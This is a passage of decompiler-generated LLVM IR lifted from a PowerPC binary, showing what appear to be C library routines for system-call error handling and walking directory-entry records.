  %v4_1000d130 = icmp eq i32 %v1_1000d124, %v0_1000d12c
  br i1 %v4_1000d130, label %dec_label_pc_1000d138, label %dec_label_pc_1000d174

dec_label_pc_1000d138:                            ; preds = %dec_label_pc_1000d124
  store i32 268489020, i32* @lr, align 4
  %v1_1000d138 = call i32 @function_1000d614(i32 %v0_1000d12c)
  store i32 %v1_1000d138, i32* %r29.global-to-local, align 4
  store i32 268489028, i32* @lr, align 4
  %v0_1000d140 = call i32 @function_1000d584()
  %v4_1000d144 = icmp eq i32 %v1_1000d138, %v0_1000d140
  br i1 %v4_1000d144, label %dec_label_pc_1000d14c.thread, label %dec_label_pc_1000d174

dec_label_pc_1000d14c.thread:                     ; preds = %dec_label_pc_1000d138
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d158:                            ; preds = %dec_label_pc_1000d110
  %v4_1000d15c = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000d15c, label %dec_label_pc_1000d164, label %dec_label_pc_1000d174

dec_label_pc_1000d164:                            ; preds = %dec_label_pc_1000d158
  br label %dec_label_pc_1000d174

dec_label_pc_1000d174:                            ; preds = %dec_label_pc_1000d164, %dec_label_pc_1000d158, %dec_label_pc_1000d138, %dec_label_pc_1000d124
  store i32 268489092, i32* @lr, align 4
  %v2_1000d180 = call i32 @function_1000cf58(i32 0, i32 32768)
  store i32 268489108, i32* @lr, align 4
  %v2_1000d190 = call i32 @function_1000cf58(i32 1, i32 32770)
  store i32 268489124, i32* @lr, align 4
  %v2_1000d1a0 = call i32 @function_1000cf58(i32 2, i32 32770)
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1a4:                            ; preds = %dec_label_pc_1000d14c.thread, %dec_label_pc_1000d174
  %v0_1000d1b0 = load i32, i32* @r30, align 4
  %v1_1000d1b0 = inttoptr i32 %v0_1000d1b0 to i32*
  %v2_1000d1b0 = load i32, i32* %v1_1000d1b0, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000d1b0, i32* inttoptr (i32 268561156 to i32*), align 4
  %v0_1000d1d0 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000d1d0, i32* @global_var_1001eb5c.513, align 4
  br i1 false, label %dec_label_pc_1000d1d8, label %dec_label_pc_1000d250

dec_label_pc_1000d1d8:                            ; preds = %dec_label_pc_1000d1a4, %dec_label_pc_1000d1d8
  br i1 undef, label %dec_label_pc_1000d1d8, label %dec_label_pc_1000d250

dec_label_pc_1000d250:                            ; preds = %dec_label_pc_1000d1d8, %dec_label_pc_1000d1a4
  %v0_1000d1fc = load i32, i32* %r28.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d1fc)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000d260 = call i32 @function_1000bb0c()
  %v2_1000d268 = inttoptr i32 %v0_1000d260 to i32*
  store i32 0, i32* %v2_1000d268, align 4
  %v0_1000d294 = load i32, i32* %r25.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000d294)
  %v0_1000d2a0 = call i32 @function_1000cc60()
  ret i32 %v0_1000d2a0

; uselistorder directives
  uselistorder i32 %v2_1000d0e8, { 1, 0 }
  uselistorder i32 %v1_1000d0e4, { 2, 1, 0 }
  uselistorder i32 %v1_1000d0b0, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000d090, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_1000cc60, { 0, 2, 3, 1 }
  uselistorder i1 false, { 0, 7, 8, 9, 2, 3, 4, 10, 11, 12, 13, 16, 14, 15, 5, 6, 1 }
  uselistorder i32 (i32, i32)* @function_1000cf58, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 4, 0, 8, 5, 9, 6, 10, 7, 2 }
  uselistorder i32 14, { 24, 0, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 2, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 4 }
  uselistorder i32* @r9, { 7, 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_1000d1d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d110, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d090, { 1, 0 }
}

define i32 @function_1000d2a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d2a4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d2bc = call i32 @__asm_mfcr()
  %v1_1000d2c0 = and i32 %v0_1000d2bc, 268435456
  %v3_1000d2c0 = icmp eq i32 %v1_1000d2c0, 0
  store i32 %v0_1000d2bc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d2c0, label %dec_label_pc_1000d2d8, label %dec_label_pc_1000d2cc

dec_label_pc_1000d2cc:                            ; preds = %dec_label_pc_1000d2a4
  %v0_1000d2cc = call i32 @function_1000bb0c()
  %v0_1000d2d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d2d0 = inttoptr i32 %v0_1000d2cc to i32*
  store i32 %v0_1000d2d0, i32* %v2_1000d2d0, align 4
  br label %dec_label_pc_1000d2d8

dec_label_pc_1000d2d8:                            ; preds = %dec_label_pc_1000d2a4, %dec_label_pc_1000d2cc
  %v0_1000d2e8 = phi i32 [ %v0_1000d2bc, %dec_label_pc_1000d2a4 ], [ -1, %dec_label_pc_1000d2cc ]
  ret i32 %v0_1000d2e8

; uselistorder directives
  uselistorder label %dec_label_pc_1000d2d8, { 1, 0 }
}

define i32 @function_1000d2ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d2ec:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000d300

dec_label_pc_1000d300:                            ; preds = %dec_label_pc_1000d300.backedge, %dec_label_pc_1000d2ec
  %v0_1000d30c = call i32 @__asm_mfcr()
  %v1_1000d310 = and i32 %v0_1000d30c, 268435456
  %v3_1000d310 = icmp eq i32 %v1_1000d310, 0
  store i32 %v0_1000d30c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d310, label %dec_label_pc_1000d300.backedge, label %dec_label_pc_1000d31c

dec_label_pc_1000d31c:                            ; preds = %dec_label_pc_1000d300
  %v0_1000d31c = call i32 @function_1000bb0c()
  %v0_1000d320 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d320 = inttoptr i32 %v0_1000d31c to i32*
  store i32 %v0_1000d320, i32* %v2_1000d320, align 4
  br label %dec_label_pc_1000d300.backedge

dec_label_pc_1000d300.backedge:                   ; preds = %dec_label_pc_1000d31c, %dec_label_pc_1000d300
  br label %dec_label_pc_1000d300
}

define i32 @function_1000d328(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d328:
  %stack_var_-104 = alloca i32, align 4
  %v2_1000d334 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000d334, i32* @r29, align 4
  %v0_1000d33c = load i32, i32* @r4, align 4
  store i32 %v0_1000d33c, i32* @r30, align 4
  %v0_1000d34c = call i32 @__asm_mfcr()
  %v1_1000d350 = and i32 %v0_1000d34c, 268435456
  %v3_1000d350 = icmp eq i32 %v1_1000d350, 0
  store i32 -1, i32* @r28, align 4
  store i32 %v0_1000d34c, i32* @r31, align 4
  br i1 %v3_1000d350, label %dec_label_pc_1000d36c, label %dec_label_pc_1000d360

dec_label_pc_1000d360:                            ; preds = %dec_label_pc_1000d328
  %v0_1000d360 = call i32 @function_1000bb0c()
  %v0_1000d364 = load i32, i32* @r31, align 4
  %v2_1000d364 = inttoptr i32 %v0_1000d360 to i32*
  store i32 %v0_1000d364, i32* %v2_1000d364, align 4
  br label %dec_label_pc_1000d384

dec_label_pc_1000d36c:                            ; preds = %dec_label_pc_1000d328
  %v3_1000d36c = icmp eq i32 %v0_1000d34c, 0
  store i32 %v0_1000d34c, i32* @r28, align 4
  br i1 %v3_1000d36c, label %dec_label_pc_1000d380, label %dec_label_pc_1000d384

dec_label_pc_1000d380:                            ; preds = %dec_label_pc_1000d36c
  %v0_1000d374 = load i32, i32* @r30, align 4
  store i32 268489604, i32* @lr, align 4
  %v4_1000d380 = call i32 @function_1000d8f0(i32* nonnull %stack_var_-104, i32 %v0_1000d374, i32 0)
  br label %dec_label_pc_1000d384

dec_label_pc_1000d384:                            ; preds = %dec_label_pc_1000d36c, %dec_label_pc_1000d360, %dec_label_pc_1000d380
  %v0_1000d388 = load i32, i32* @r28, align 4
  ret i32 %v0_1000d388

; uselistorder directives
  uselistorder i32 %v0_1000d34c, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000d384, { 2, 0, 1 }
}

define i32 @function_1000d39c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000d39c:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_1000d3b0 = call i32 @function_1000d42c()
  store i32 %v0_1000d3b0, i32* @r30, align 4
  %tmp18 = icmp slt i32 %v0_1000d3b0, 1
  br i1 %tmp18, label %dec_label_pc_1000d414, label %dec_label_pc_1000d3bc

dec_label_pc_1000d3bc:                            ; preds = %dec_label_pc_1000d39c
  %v0_1000d3bc = load i32, i32* @r31, align 4
  %v2_1000d3bc = add i32 %v0_1000d3bc, %v0_1000d3b0
  store i32 %v2_1000d3bc, i32* %r29.global-to-local, align 4
  %v2_1000d4043 = icmp ult i32 %v0_1000d3bc, %v2_1000d3bc
  br i1 %v2_1000d4043, label %dec_label_pc_1000d3c4, label %dec_label_pc_1000d414

dec_label_pc_1000d3c4:                            ; preds = %dec_label_pc_1000d3bc, %dec_label_pc_1000d3c4
  %v1_1000d3d4 = phi i32 [ %v2_1000d400, %dec_label_pc_1000d3c4 ], [ %v0_1000d3bc, %dec_label_pc_1000d3bc ]
  %v1_1000d40810.in = phi i32 [ %v2_1000d400, %dec_label_pc_1000d3c4 ], [ %v0_1000d3bc, %dec_label_pc_1000d3bc ]
  %v1_1000d40c11.in = phi i32 [ %v2_1000d400, %dec_label_pc_1000d3c4 ], [ %v0_1000d3bc, %dec_label_pc_1000d3bc ]
  %v1_1000d40810 = add i32 %v1_1000d40810.in, 11
  %v1_1000d40c11 = add i32 %v1_1000d40c11.in, 19
  %v1_1000d3c4 = add i32 %v1_1000d3d4, 4
  %v2_1000d3c4 = inttoptr i32 %v1_1000d3c4 to i32*
  %v3_1000d3c4 = load i32, i32* %v2_1000d3c4, align 4
  store i32 %v3_1000d3c4, i32* %r11.global-to-local, align 4
  %v1_1000d3c8 = add i32 %v1_1000d3d4, 12
  %v2_1000d3c8 = inttoptr i32 %v1_1000d3c8 to i32*
  %v3_1000d3c8 = load i32, i32* %v2_1000d3c8, align 4
  %v1_1000d3cc = add i32 %v1_1000d3d4, 16
  %v2_1000d3cc = inttoptr i32 %v1_1000d3cc to i16*
  %v3_1000d3cc = load i16, i16* %v2_1000d3cc, align 2
  %v4_1000d3cc = zext i16 %v3_1000d3cc to i32
  store i32 %v4_1000d3cc, i32* %r5.global-to-local, align 4
  %v1_1000d3d0 = add i32 %v1_1000d3d4, 18
  %v2_1000d3d0 = inttoptr i32 %v1_1000d3d0 to i8*
  %v3_1000d3d0 = load i8, i8* %v2_1000d3d0, align 1
  %v4_1000d3d0 = zext i8 %v3_1000d3d0 to i32
  store i32 %v4_1000d3d0, i32* %r9.global-to-local, align 4
  store i32 %v3_1000d3c8, i32* %v2_1000d3c4, align 4
  %v0_1000d3d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d3d8 = load i32, i32* @r31, align 4
  %v2_1000d3d8 = inttoptr i32 %v1_1000d3d8 to i32*
  store i32 %v0_1000d3d8, i32* %v2_1000d3d8, align 4
  %v0_1000d3dc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3dc = trunc i32 %v0_1000d3dc to i8
  %v2_1000d3dc = load i32, i32* @r31, align 4
  %v3_1000d3dc = add i32 %v2_1000d3dc, 10
  %v4_1000d3dc = inttoptr i32 %v3_1000d3dc to i8*
  store i8 %v1_1000d3dc, i8* %v4_1000d3dc, align 1
  %v0_1000d3e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d3e0 = trunc i32 %v0_1000d3e0 to i16
  %v2_1000d3e0 = load i32, i32* @r31, align 4
  %v3_1000d3e0 = add i32 %v2_1000d3e0, 8
  %v4_1000d3e0 = inttoptr i32 %v3_1000d3e0 to i16*
  store i16 %v1_1000d3e0, i16* %v4_1000d3e0, align 2
  %v0_1000d3e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d3e4 = add i32 %v0_1000d3e4, -19
  store i32 %v1_1000d3e4, i32* %r5.global-to-local, align 4
  store i32 268489708, i32* @lr, align 4
  %v3_1000d3e8 = call i32 @function_1000bbec(i32 %v1_1000d40810, i32 %v1_1000d40c11, i32 %v1_1000d3e4)
  %v0_1000d3ec = load i32, i32* @r31, align 4
  %v1_1000d3ec = add i32 %v0_1000d3ec, 8
  %v2_1000d3ec = inttoptr i32 %v1_1000d3ec to i16*
  %v3_1000d3ec = load i16, i16* %v2_1000d3ec, align 2
  %v4_1000d3ec = zext i16 %v3_1000d3ec to i32
  store i32 %v4_1000d3ec, i32* %r5.global-to-local, align 4
  store i32 268489724, i32* @lr, align 4
  %v3_1000d3f8 = call i32 @function_1000bbec(i32 %v0_1000d3ec, i32 %v0_1000d3ec, i32 %v4_1000d3ec)
  %v0_1000d3fc = load i32, i32* @r31, align 4
  %v1_1000d3fc = add i32 %v0_1000d3fc, 8
  %v2_1000d3fc = inttoptr i32 %v1_1000d3fc to i16*
  %v3_1000d3fc = load i16, i16* %v2_1000d3fc, align 2
  %v4_1000d3fc = zext i16 %v3_1000d3fc to i32
  %v2_1000d400 = add i32 %v4_1000d3fc, %v0_1000d3fc
  store i32 %v2_1000d400, i32* @r31, align 4
  %v1_1000d404 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d404 = icmp ult i32 %v2_1000d400, %v1_1000d404
  br i1 %v2_1000d404, label %dec_label_pc_1000d3c4, label %dec_label_pc_1000d404.dec_label_pc_1000d414.loopexit_crit_edge

dec_label_pc_1000d404.dec_label_pc_1000d414.loopexit_crit_edge: ; preds = %dec_label_pc_1000d3c4
  %v0_1000d418.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d414

dec_label_pc_1000d414:                            ; preds = %dec_label_pc_1000d3bc, %dec_label_pc_1000d404.dec_label_pc_1000d414.loopexit_crit_edge, %dec_label_pc_1000d39c
  %v0_1000d418 = phi i32 [ %v0_1000d3b0, %dec_label_pc_1000d39c ], [ %v0_1000d418.pre.pre, %dec_label_pc_1000d404.dec_label_pc_1000d414.loopexit_crit_edge ], [ %v0_1000d3b0, %dec_label_pc_1000d3bc ]
  ret i32 %v0_1000d418

; uselistorder directives
  uselistorder i32 %v2_1000d400, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v0_1000d3ec, { 1, 0, 2 }
  uselistorder i32 %v1_1000d3d4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000d3bc, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_1000d3b0, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_1000bbec, { 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 11, { 0, 42, 35, 2, 9, 10, 18, 11, 12, 19, 13, 14, 20, 21, 36, 37, 38, 39, 40, 41, 1, 22, 15, 23, 24, 25, 26, 27, 3, 28, 29, 4, 30, 31, 16, 5, 32, 33, 17, 6, 34, 7, 43, 44, 45, 46, 47, 48, 8 }
  uselistorder label %dec_label_pc_1000d414, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d3c4, { 1, 0 }
}

define i32 @function_1000d42c() local_unnamed_addr {
dec_label_pc_1000d42c:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000d430 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000d430, i32* %stack_var_-48, align 4
  %v5_1000d430 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v4_1000d430, i32* %r9.global-to-local, align 4
  %v0_1000d43c = load i32, i32* @r5, align 4
  %v1_1000d43c = add i32 %v0_1000d43c, 30
  %v1_1000d440 = call i32 @__asm_rlwinm(i32 %v1_1000d43c, i32 0, i32 0, i32 27)
  store i32 %v5_1000d430, i32* @r31, align 4
  %v1_1000d450 = load i32, i32* @r1, align 4
  %v3_1000d450 = sub i32 %v1_1000d450, %v1_1000d440
  %v4_1000d450 = inttoptr i32 %v3_1000d450 to i32*
  store i32 %v4_1000d430, i32* %v4_1000d450, align 4
  %v0_1000d454 = load i32, i32* @r4, align 4
  store i32 %v0_1000d454, i32* @r28, align 4
  %v0_1000d458 = load i32, i32* @r5, align 4
  store i32 %v0_1000d458, i32* @r23, align 4
  %v0_1000d45c = load i32, i32* @r3, align 4
  store i32 %v0_1000d45c, i32* @r22, align 4
  %v1_1000d460 = add i32 %v3_1000d450, 23
  %v1_1000d464 = call i32 @__asm_rlwinm(i32 %v1_1000d460, i32 0, i32 0, i32 27)
  store i32 %v1_1000d464, i32* @r27, align 4
  store i32 %v1_1000d464, i32* %r4.global-to-local, align 4
  %v0_1000d474 = call i32 @__asm_mfcr()
  %v1_1000d478 = and i32 %v0_1000d474, 268435456
  store i32 %v1_1000d478, i32* %r9.global-to-local, align 4
  %v3_1000d478 = icmp eq i32 %v1_1000d478, 0
  store i32 %v0_1000d474, i32* %r30.global-to-local, align 4
  br i1 %v3_1000d478, label %dec_label_pc_1000d490, label %dec_label_pc_1000d484

dec_label_pc_1000d484:                            ; preds = %dec_label_pc_1000d42c
  %v0_1000d484 = call i32 @function_1000bb0c()
  %v0_1000d488 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d488 = inttoptr i32 %v0_1000d484 to i32*
  store i32 %v0_1000d488, i32* %v2_1000d488, align 4
  br label %dec_label_pc_1000d49c

dec_label_pc_1000d490:                            ; preds = %dec_label_pc_1000d42c
  %v3_1000d490 = icmp eq i32 %v0_1000d474, -1
  store i32 %v0_1000d474, i32* %r24.global-to-local, align 4
  br i1 %v3_1000d490, label %dec_label_pc_1000d49c, label %dec_label_pc_1000d4a4

dec_label_pc_1000d49c:                            ; preds = %dec_label_pc_1000d490, %dec_label_pc_1000d484
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d568

dec_label_pc_1000d4a4:                            ; preds = %dec_label_pc_1000d490
  %v0_1000d4a4 = load i32, i32* @r28, align 4
  store i32 %v0_1000d4a4, i32* %r29.global-to-local, align 4
  store i32 %v1_1000d464, i32* %r30.global-to-local, align 4
  store i32 -1, i32* @r25, align 4
  store i32 -1, i32* %r26.global-to-local, align 4
  %v2_1000d54c12 = add i32 %v0_1000d474, %v1_1000d464
  %v1_1000d55013 = load i32, i32* @r23, align 4
  %v2_1000d55014 = add i32 %v1_1000d55013, %v0_1000d4a4
  store i32 %v2_1000d55014, i32* %r10.global-to-local, align 4
  %v2_1000d55415 = icmp ult i32 %v1_1000d464, %v2_1000d54c12
  %v1_1000d55818 = add i32 %v0_1000d4a4, 19
  store i32 %v1_1000d55818, i32* @r3, align 4
  %v1_1000d55c19 = add i32 %v1_1000d464, 19
  store i32 %v1_1000d55c19, i32* @r4, align 4
  br i1 %v2_1000d55415, label %dec_label_pc_1000d4b8, label %dec_label_pc_1000d564

dec_label_pc_1000d4b8:                            ; preds = %dec_label_pc_1000d4a4, %dec_label_pc_1000d500
  %v0_1000d4b820 = phi i32 [ %v2_1000d548, %dec_label_pc_1000d500 ], [ %v1_1000d464, %dec_label_pc_1000d4a4 ]
  %v1_1000d4b8 = add i32 %v0_1000d4b820, 16
  %v2_1000d4b8 = inttoptr i32 %v1_1000d4b8 to i16*
  %v3_1000d4b8 = load i16, i16* %v2_1000d4b8, align 2
  %v4_1000d4b8 = zext i16 %v3_1000d4b8 to i32
  %v1_1000d4bc = add nuw nsw i32 %v4_1000d4b8, 7
  store i32 %v1_1000d4bc, i32* %r9.global-to-local, align 4
  %v1_1000d4c0 = call i32 @__asm_rlwinm(i32 %v1_1000d4bc, i32 0, i32 0, i32 28)
  %v0_1000d4c4 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000d4c4 = add i32 %v1_1000d4c0, %v0_1000d4c4
  store i32 %v3_1000d4c4, i32* %r11.global-to-local, align 4
  %v1_1000d4c8 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000d4c8 = icmp ugt i32 %v3_1000d4c4, %v1_1000d4c8
  br i1 %v3_1000d4c8, label %dec_label_pc_1000d4d0, label %dec_label_pc_1000d500

dec_label_pc_1000d4d0:                            ; preds = %dec_label_pc_1000d4b8
  %v0_1000d4d0 = load i32, i32* @r22, align 4
  %v0_1000d4d4 = load i32, i32* @r25, align 4
  %v0_1000d4d8 = load i32, i32* %r26.global-to-local, align 4
  store i32 268489956, i32* @lr, align 4
  %v4_1000d4e0 = call i32 @function_1000d6a4(i32 %v0_1000d4d0, i32 %v0_1000d4d4, i32 %v0_1000d4d8, i32 0)
  %v0_1000d4e4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d4e4 = load i32, i32* @r28, align 4
  %v4_1000d4e4 = icmp eq i32 %v0_1000d4e4, %v1_1000d4e4
  br i1 %v4_1000d4e4, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d564

dec_label_pc_1000d4ec:                            ; preds = %dec_label_pc_1000d4d0
  %v0_1000d4ec = call i32 @function_1000bb0c()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000d4f8 = inttoptr i32 %v0_1000d4ec to i32*
  store i32 22, i32* %v2_1000d4f8, align 4
  %v0_1000d56c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d568

dec_label_pc_1000d500:                            ; preds = %dec_label_pc_1000d4b8
  %v2_1000d4c0 = trunc i32 %v1_1000d4c0 to i16
  %v0_1000d500 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d500 = inttoptr i32 %v0_1000d500 to i32*
  %v2_1000d500 = load i32, i32* %v1_1000d500, align 4
  store i32 %v2_1000d500, i32* %r9.global-to-local, align 4
  %v1_1000d504 = add i32 %v0_1000d500, 4
  %v2_1000d504 = inttoptr i32 %v1_1000d504 to i32*
  %v3_1000d504 = load i32, i32* %v2_1000d504, align 4
  store i32 %v3_1000d504, i32* %r10.global-to-local, align 4
  %v1_1000d508 = add i32 %v0_1000d500, 8
  %v2_1000d508 = inttoptr i32 %v1_1000d508 to i32*
  %v3_1000d508 = load i32, i32* %v2_1000d508, align 4
  store i32 %v3_1000d508, i32* @r25, align 4
  %v1_1000d50c = add i32 %v0_1000d500, 12
  %v2_1000d50c = inttoptr i32 %v1_1000d50c to i32*
  %v3_1000d50c = load i32, i32* %v2_1000d50c, align 4
  store i32 %v3_1000d50c, i32* %r26.global-to-local, align 4
  %v2_1000d510 = inttoptr i32 %v0_1000d4c4 to i32*
  store i32 %v2_1000d500, i32* %v2_1000d510, align 4
  %v0_1000d514 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d514 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d514 = add i32 %v1_1000d514, 4
  %v3_1000d514 = inttoptr i32 %v2_1000d514 to i32*
  store i32 %v0_1000d514, i32* %v3_1000d514, align 4
  %v0_1000d518 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d518 = add i32 %v0_1000d518, 8
  %v2_1000d518 = inttoptr i32 %v1_1000d518 to i32*
  %v3_1000d518 = load i32, i32* %v2_1000d518, align 4
  store i32 %v3_1000d518, i32* %r9.global-to-local, align 4
  %v1_1000d51c = add i32 %v0_1000d518, 12
  %v2_1000d51c = inttoptr i32 %v1_1000d51c to i32*
  %v3_1000d51c = load i32, i32* %v2_1000d51c, align 4
  store i32 %v3_1000d51c, i32* %r10.global-to-local, align 4
  %v3_1000d520 = load i32, i32* %r29.global-to-local, align 4
  %v4_1000d520 = add i32 %v3_1000d520, 16
  %v5_1000d520 = inttoptr i32 %v4_1000d520 to i16*
  store i16 %v2_1000d4c0, i16* %v5_1000d520, align 2
  %v0_1000d524 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d524 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d524 = add i32 %v1_1000d524, 8
  %v3_1000d524 = inttoptr i32 %v2_1000d524 to i32*
  store i32 %v0_1000d524, i32* %v3_1000d524, align 4
  %v0_1000d528 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d528 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d528 = add i32 %v1_1000d528, 12
  %v3_1000d528 = inttoptr i32 %v2_1000d528 to i32*
  store i32 %v0_1000d528, i32* %v3_1000d528, align 4
  %v0_1000d52c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d52c = add i32 %v0_1000d52c, 18
  %v2_1000d52c = inttoptr i32 %v1_1000d52c to i8*
  %v3_1000d52c = load i8, i8* %v2_1000d52c, align 1
  %v2_1000d530 = load i32, i32* %r29.global-to-local, align 4
  %v3_1000d530 = add i32 %v2_1000d530, 18
  %v4_1000d530 = inttoptr i32 %v3_1000d530 to i8*
  store i8 %v3_1000d52c, i8* %v4_1000d530, align 1
  %v0_1000d534 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000d534, i32* %r29.global-to-local, align 4
  %v0_1000d538 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d538 = add i32 %v0_1000d538, 16
  %v2_1000d538 = inttoptr i32 %v1_1000d538 to i16*
  %v3_1000d538 = load i16, i16* %v2_1000d538, align 2
  %v4_1000d538 = zext i16 %v3_1000d538 to i32
  %v1_1000d53c = add nsw i32 %v4_1000d538, -19
  store i32 %v1_1000d53c, i32* @r5, align 4
  store i32 268490052, i32* @lr, align 4
  %v0_1000d540 = call i32 @function_1000bb50()
  %v0_1000d544 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d544 = add i32 %v0_1000d544, 16
  %v2_1000d544 = inttoptr i32 %v1_1000d544 to i16*
  %v3_1000d544 = load i16, i16* %v2_1000d544, align 2
  %v4_1000d544 = zext i16 %v3_1000d544 to i32
  %v2_1000d548 = add i32 %v4_1000d544, %v0_1000d544
  store i32 %v2_1000d548, i32* %r30.global-to-local, align 4
  %v1_1000d54c.pre = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d550.pre = load i32, i32* @r28, align 4
  %v0_1000d558.pre = load i32, i32* %r29.global-to-local, align 4
  %v2_1000d54c = add i32 %v1_1000d54c.pre, %v1_1000d464
  %v1_1000d550 = load i32, i32* @r23, align 4
  %v2_1000d550 = add i32 %v1_1000d550, %v0_1000d550.pre
  store i32 %v2_1000d550, i32* %r10.global-to-local, align 4
  %v2_1000d554 = icmp ult i32 %v2_1000d548, %v2_1000d54c
  %v1_1000d558 = add i32 %v0_1000d558.pre, 19
  store i32 %v1_1000d558, i32* @r3, align 4
  %v1_1000d55c = add i32 %v2_1000d548, 19
  store i32 %v1_1000d55c, i32* @r4, align 4
  br i1 %v2_1000d554, label %dec_label_pc_1000d4b8, label %dec_label_pc_1000d564

dec_label_pc_1000d564:                            ; preds = %dec_label_pc_1000d4a4, %dec_label_pc_1000d500, %dec_label_pc_1000d4d0
  %v1_1000d564 = phi i32 [ %v0_1000d4e4, %dec_label_pc_1000d4d0 ], [ %v0_1000d4a4, %dec_label_pc_1000d4a4 ], [ %v0_1000d558.pre, %dec_label_pc_1000d500 ]
  %v0_1000d564 = phi i32 [ %v1_1000d4e4, %dec_label_pc_1000d4d0 ], [ %v0_1000d4a4, %dec_label_pc_1000d4a4 ], [ %v0_1000d550.pre, %dec_label_pc_1000d500 ]
  %v2_1000d564 = sub i32 %v1_1000d564, %v0_1000d564
  store i32 %v2_1000d564, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d568

dec_label_pc_1000d568:                            ; preds = %dec_label_pc_1000d4ec, %dec_label_pc_1000d49c, %dec_label_pc_1000d564
  %v0_1000d56c = phi i32 [ %v0_1000d56c.pre, %dec_label_pc_1000d4ec ], [ -1, %dec_label_pc_1000d49c ], [ %v2_1000d564, %dec_label_pc_1000d564 ]
  %v0_1000d568 = load i32, i32* @r1, align 4
  %v1_1000d568 = inttoptr i32 %v0_1000d568 to i32*
  %v2_1000d568 = load i32, i32* %v1_1000d568, align 4
  store i32 %v2_1000d568, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000d56c

; uselistorder directives
  uselistorder i32 %v2_1000d548, { 2, 1, 3, 0 }
  uselistorder i32 %v0_1000d500, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000d4c0, { 1, 0 }
  uselistorder i32 %v0_1000d474, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_1000d464, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8 }
